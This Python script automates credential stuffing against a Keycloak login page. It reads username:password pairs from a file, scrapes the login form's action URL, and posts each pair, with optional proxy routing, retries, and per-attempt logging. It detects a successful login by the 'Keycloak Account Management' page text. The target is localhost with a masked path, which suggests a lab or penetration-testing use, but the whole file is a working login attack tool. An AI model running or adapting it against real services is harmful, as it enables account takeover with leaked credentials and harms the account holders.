import requests
from bs4 import BeautifulSoup
import time
from datetime import datetime

def get_action_url_from_response(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find('form', {'id': 'kc-form-login'})
    return form['action']


def post_with_credentials(proxy=None):
    #response = requests.get(url, proxies=proxy)
    url = "https://localhost/auth/realms/master/xxxxxxx"
    credentials_file = "credential.txt"
    f = open(credentials_file,"r",encoding="utf-8")
    credentials = [line.strip().split(':') for line in f.readlines()]
    f.close()
    for username, password in credentials:
        body_params = {
            'username': username,
            'password': password,
            'credentialId': ''
        }
        c = open(password+".txt","a")
        now = datetime.now()
        ct = now.strftime("%D:%H:%M")
        c.write(ct + '\n')
        time.sleep(1)
        s = requests.Session()
        response = s.get(url, proxies=proxy)
        action_url = get_action_url_from_response(response)
        print("[+] Trying username: "+username)
        c.write("[+] Trying username: "+username + '\n')
        try:
            response = s.post(action_url, data=body_params, proxies=proxy)   
        except requests.exceptions.RequestException as e:
            print(f"[!] Request Error: Trying again {e}")
            c.write(f"[!] Request Error: Trying again {e}" + '\n')
            time.sleep(10)
            response = s.post(action_url, data=body_params, proxies=proxy)
        if "Invalid username or password" in response.text:
            print("[-]")
            c.write("[-]" + '\n')
            action_url = get_action_url_from_response(response)
        elif "Keycloak Account Management" in response.text:
                print("[*] Connection Successful")
                c.write("[*] Connection Successful" + '\n')
                s.close()
                time.sleep(5)
        else:
            print("[!] Somethings's wrong")
            c.write("[!] Somethings's wrong" + '\n')

        #action_url = get_action_url_from_response(response)
        # if not action_url:
        #     action_url = '/login'      
    c.close()  
            
if __name__ == '__main__':
    #parser = argparse.ArgumentParser(description='Perform POST requests with credentials to a URL')
    #parser.add_argument('url', type=str, help='URL to perform requests on')
    #parser.add_argument('credentials_file', type=str, help='Path to file containing credentials')
    #parser.add_argument('-p', '--proxy', type=str, help='HTTP proxy to tunnel traffic through')
    #args = parser.parse_args()
    #proxies = {'http': args.proxy} if args.proxy else None
    post_with_credentials()
